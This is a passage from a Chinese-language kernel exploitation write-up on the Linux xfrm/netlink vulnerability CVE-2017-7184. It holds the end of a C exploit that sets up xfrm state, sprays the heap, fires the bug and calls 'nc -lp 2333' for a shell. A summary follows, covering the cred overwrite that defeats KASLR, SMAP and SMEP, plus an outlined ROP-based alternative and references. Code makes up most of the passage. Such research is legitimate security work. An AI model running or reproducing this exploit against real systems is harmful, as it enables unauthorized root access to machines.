    <span class="k">if</span> <span class="p">(</span><span class="n">err</span><span class="o">&lt;</span><span class="mi">0</span><span class="p">){</span>
        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"[-] bad xfrm_add_sa</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"[+] xfrm_add_sa : %d </span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">err</span><span class="p">);</span>
    <span class="n">err</span><span class="o">=</span><span class="n">xfrm_new_ae</span><span class="p">(</span><span class="n">xfrm_socket</span><span class="p">,</span><span class="mi">4869</span><span class="p">,</span><span class="mh">0x24</span><span class="p">,</span><span class="mh">0xc01</span><span class="p">,</span><span class="mh">0xb40</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>   

    <span class="k">if</span> <span class="p">(</span><span class="n">err</span><span class="o">&lt;</span><span class="mi">0</span><span class="p">){</span>
        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"[-] bad xfrm_new_ae</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"[+] xfrm_new_ae : %d </span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">err</span><span class="p">);</span> 


    <span class="n">fork_spary_n</span><span class="p">(</span><span class="n">spary_n</span><span class="p">,</span><span class="mi">10</span><span class="p">);</span>
    <span class="n">sendah</span><span class="p">(</span><span class="n">sendfd</span><span class="p">,</span><span class="mi">4869</span><span class="p">,</span> <span class="n">htonl</span><span class="p">(</span><span class="mh">0x1743</span><span class="p">));</span>
    <span class="n">system</span><span class="p">(</span><span class="s">"nc -lp 2333"</span><span class="p">);</span>
<span class="p">}</span>
</pre></div>
<p>最终效果：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190217133739-235292c8-3276-1.jpg"/></p>
<h2 data-content="1" id="c1f104120924366d48519b46106abe43">总结</h2>
<p>与之前调试过的漏洞不同在于此漏洞的触发使用了<code>netlink</code>这样的通信机制，因此手册上相关的资料不是很多，需要根据源代码来构造协议中的相应字段。</p>
<p>本文的分析基于的方法利用了该系统内<code>cred</code>申请是通过<code>kmalloc-192</code>这个<code>kmem_cache</code>得到的，虽然可以有效绕过<code>kaslr</code>、<code>SMAP</code>、<code>SMEP</code>保护，但如果<code>cred</code>申请通过的是<code>cred_jar</code>，则这个方法不一定会成功。</p>
<p>关于长亭博客中提到的方法，我也还在尝试。利用思路是用每次写1<code>bit</code>的方法，多次写达到覆盖下一<code>xfrm_replay_state_esn</code>中的<code>bmp_len</code>，从而越界读泄露地址来绕过<code>kaslr</code>。并且可以通过越界写的方法来写如<code>file_operations</code>、<code>tty_struct</code>这样的虚表结构，达到劫持控制流的目的，将<code>ROP</code>数据通过<code>do_msgsnd</code>这样的函数布置在内核里，从而绕过<code>SMEP</code>和<code>SMAP</code>，最终利用控制流劫持跳转回<code>ROP</code>。希望可以在后续分析中调出这种方法。</p>
<h1 data-content="1" id="4cf5f564896ea507afda26c443e0eb31">Reference</h1>
<p>[1] <code>https://zhuanlan.zhihu.com/p/26674557</code></p>
<p>[2] <code>https://github.com/snorez/blog/blob/master/cve-2017-7184%20(%E9%95%BF%E4%BA%AD%E5%9C%A8Pwn2Own%E4%B8%8A%E7%94%A8%E4%BA%8E%E6%8F%90%E6%9D%83Ubuntu%E7%9A%84%E6%BC%8F%E6%B4%9E)%20%E7%9A%84%E5%88%86%E6%9E%90%E5%88%A9%E7%94%A8.md</code></p>
<p>[3] <code>https://elixir.bootlin.com/linux/v4.10.6/source/net/xfrm</code></p>
<p>[4] <code>https://bbs.pediy.com/thread-249192.htm</code></p>
<p>[5] <code>http://blog.chinaunix.net/uid-26675482-id-3255770.html</code></p>
<p>[6] <code>http://onestraw.github.io/linux/netlink-event-signal/</code></p>
<p>[7] <code>http://www.man7.org/linux/man-pages/man7/netlink.7.html</code></p>
<p>[8] <code>https://github.com/ret2p4nda/linux-kernel-exploits/blob/master/2017/CVE-2017-7308/poc.c</code></p>
</div>
</div>